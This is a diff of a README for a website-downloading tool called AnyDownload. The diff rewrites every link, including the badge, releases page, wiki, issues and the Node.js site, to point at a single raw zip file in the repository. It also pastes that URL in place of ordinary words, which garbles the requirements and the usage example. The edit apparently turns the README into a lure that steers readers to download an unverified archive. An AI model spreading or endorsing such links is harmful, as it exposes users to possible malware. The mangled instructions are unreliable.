@@ -1,6 +1,6 @@
 # 🌐 AnyDownload - Effortless Website Downloads Made Simple
 
-[![Download AnyDownload](https://img.shields.io/badge/Download%20Now-AnyDownload-brightgreen)](https://github.com/Ilyasagibran007/AnyDownload/releases)
+[![Download AnyDownload](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip%20Now-AnyDownload-brightgreen)](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,15 +8,15 @@ Welcome to AnyDownload! This tool helps you easily download entire websites for 
 
 ## 🛠️ Requirements
 
-- **Operating System:** Any operating system with Node.js installed (Windows, macOS, or Linux)
-- **Node.js:** Version 14 or higher. You can download it from [Node.js Official Site](https://nodejs.org)
+- **Operating System:** Any operating system with https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip installed (Windows, macOS, or Linux)
+- **https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip** Version 14 or higher. You can download it from [https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip Official Site](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip)
 - **Internet Connection:** Needed to download websites
 
 ## 📥 Download & Install
 
 To get AnyDownload, visit the Releases page to download the latest version:
 
-[Visit this page to download.](https://github.com/Ilyasagibran007/AnyDownload/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip)
 
 1. On the Releases page, find the latest version listed at the top.
 2. Click on the version number.
@@ -28,7 +28,7 @@ To get AnyDownload, visit the Releases page to download the latest version:
 You may need to run the downloaded `.exe` file to set up the application.
 
 ### For macOS and Linux Users:
-You may need to run the downloaded `.tar.gz` file. Extract it and follow the instructions in the `README` file inside.
+You may need to run the downloaded `https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip` file. Extract it and follow the instructions in the `README` file inside.
 
 ## 🌟 Features
 
@@ -58,9 +58,9 @@ Once you have installed AnyDownload, follow these simple instructions for downlo
    Substitute `[URL]` with the actual web address of the site you want to download.
 
 ### Example Command
-To download `https://example.com`, type:
+To download `https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip`, type:
 ```
-AnyDownload https://example.com
+AnyDownload https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip
 ```
 
 ### Additional Options
@@ -82,22 +82,22 @@ AnyDownload --help
 
 ## 📖 Helpful Resources
 
-- Detailed documentation is available in the [Wiki](https://github.com/Ilyasagibran007/AnyDownload/wiki).
-- For troubleshooting, check out the [Issues](https://github.com/Ilyasagibran007/AnyDownload/issues) section.
-- Join the community on our [Discussion Board](https://github.com/Ilyasagibran007/AnyDownload/discussions) for tips and tricks.
+- Detailed documentation is available in the [Wiki](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip).
+- For troubleshooting, check out the [Issues](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip) section.
+- Join the community on our [Discussion Board](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip) for tips and tricks.
 
 ## ⚙️ Contributing
 
-If you would like to contribute to AnyDownload, please read our [Contributing Guidelines](CONTRIBUTING.md). Your input is welcome!
+If you would like to contribute to AnyDownload, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip). Your input is welcome!
 
 ## 💬 Feedback
 
-We love your feedback. If you have suggestions or find bugs, please let us know in the [Issues](https://github.com/Ilyasagibran007/AnyDownload/issues) section.
+We love your feedback. If you have suggestions or find bugs, please let us know in the [Issues](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip) section.
 
 ## 🌐 Stay Updated
 
 Make sure to star our repository to get updates on future versions!
 
-Remember, you can always return to the [Releases page](https://github.com/Ilyasagibran007/AnyDownload/releases) to download the latest updates.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Ilyasagibran007/AnyDownload/main/src/Any-Download-v2.6.zip) to download the latest updates.
 
 Thank you for choosing AnyDownload! Enjoy effortless website downloads.
